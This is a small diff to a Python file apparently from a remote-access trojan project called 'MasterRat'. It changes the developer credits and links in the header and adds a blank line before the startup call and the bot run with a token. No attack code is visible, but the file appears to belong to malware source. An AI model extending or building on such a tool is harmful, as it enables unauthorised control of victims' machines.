@@ -1,6 +1,4 @@
-# 🚀 MasterRat - Asterfion X Hades
-# 🌐 Links : https://guns.lol/asterfion | https://guns.lol/j_hoover
-# 🛠️ Developed by Asterfion and Hades
+# 🛠️ Developed by Asterfion and Dr1p
 # 💡 MasterRat is also better bro
 # 🇫🇷 Developed in french only !
 # 🪲 Si vous voyez des bugs ou autres c'est normal c'est la 1.0 !
@@ -615,4 +613,5 @@ def MasterStartup():
 
 if __name__ == "__main__":
     MasterStartup()
+
     MasterRat.run(MasterRatToken)  
